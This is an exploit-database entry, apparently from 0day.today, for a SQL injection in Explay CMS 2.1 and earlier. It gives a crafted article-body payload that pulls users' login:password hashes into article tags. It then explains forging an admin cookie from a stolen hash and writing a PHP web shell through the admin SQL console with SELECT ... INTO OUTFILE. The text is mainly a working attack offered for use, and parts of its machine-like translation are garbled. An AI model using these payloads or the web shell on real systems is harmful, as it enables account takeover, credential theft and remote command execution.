@@ -1,0 +1,154 @@
+id: 11133
+date: 03/01/2010
+title: Explay CMS <= 2.1 SQL Injection Vulnerabilities
+author: 0day Today Team
+cves: 
+
+===============================================
+Explay CMS <= 2.1 SQL Injection Vulnerabilities
+===============================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+
+
+The vulnerability makes it possible to obtain the password hash of any user.
+Exploitation of the vulnerability can be disabled when PHP-directive magic_quotes_gpc.
+
+To obtain the password you want to add an article (http:// [explay] / my_articles / add /) with a code specially formed SQL-query in the box art_body (ie the main text of the article).
+
+Code adding new articles:
+modules / articles / mysql.class.php
+
+PHP code :
+
+
+public function add_article ($art) {
+        $this->db->query ("INSERT INTO ".DB_PEREFIX."_articles VALUES (
+                        0,
+                        '".$art['art_category']."',
+                        '".$art['art_header']."',
+                        '".$art['art_body']."',
+                        '".User::$properties['user_id']."',
+                        '".time()."',
+                        '".$art['art_comments']."',
+                        '',
+                        '',
+                        '".$art['art_publik']."',
+                        'no',
+                        '".$art['art_visible']."',
+                        '".$art['art_tags']."',
+                        '0',
+                        '',
+                        '0',
+                        '".$art['auto_tag']."'
+        )");
+
+
+ 
+Represents poisonous "text" article:
+
+PHP code:
+
+ aaaaa',  
+(SELECT user_id FROM expl_users WHERE user_login='<UR_LOGIN>'),  
+'1228445451',  
+'on',  
+'',  
+'',  
+'yes',  
+'no',  
+'on',  
+(SELECT concat_ws(0x3a, user_login, user_password) FROM expl_users WHERE user_login='<USER'S_LOGIN>'),
+'0',  
+'',  
+'0',  
+'yes' )/*
+
+
+Subqueries :
+
+(SELECT user_id FROM expl_users WHERE user_login='<UR_LOGIN>')
+
+
+want to become just added on our behalf (so how do you know your user_id prevents engine)
+
+As a result, execute such a query:
+
+PHP code:
+
+ INSERT INTO expl_articles VALUES ( 0,  
+'',  
+'some_title',  
+'aaaaa',  
+(SELECT user_id FROM expl_users WHERE user_login='<UR_LOGIN>'),  
+'1228445451',  
+'on',  
+'',  
+'',  
+'yes',  
+'no',  
+'on',  
+(SELECT concat_ws(0x3a, user_login, user_password) FROM expl_users WHERE user_login='<USER'S_LOGIN>'),
+'0',  
+'',  
+'0',  
+'yes )
+
+
+
+The result of the nested query in the form of "login: password" in the tags, such as:
+
+admin:012ce7449da5b5afb89db5f32810946ea94098e6
+
+ 
+There is however one subtlety. Passwords are encrypted by different algorithms:
+
+PHP code:
+
+ function expl_hash($str) {
+    if (function_exists('sha1'))
+        return sha1($str);  
+    elseif (function_exists('mhash'))
+        return bin2hex(mhash(MHASH_SHA1, $str));
+    else
+        return md5($str);
+}
+
+
+ 
+Type hash lekgo determine the length of the line. (MD5 - 32 bytes, SHA1 - 40 bytes).
+
+To the great happiness, engine user authentication is implemented through Cookies, so that we can not Brutus hash,
+and just create a cookie with the login and pass the appropriate values. Now we are admin.
+
+ 
+Getting shell
+But that's not all! Built-in admin interface to perform arbitrary SQL-queries allows us to create a shell (if included file_priv):
+
+PHP code:
+
+SELECT '<?php system($_GET["cmd"]) ?>' INTO OUTFILE '????_?_??????/shell.php'
+
+ 
+Here, we must obtain your own user_id, as it should indicate if the box so that we have been the author of the article.
+You can of course not specify "WHERE user_login = '<UR_LOGIN>'" and to write such a unit (user_id = 1), but then the author would himself admin =).
+<UR_LOGIN> - Our name (not to be confused with the name!).
+
+
+
+#  0day.today [2023-03-24]  #
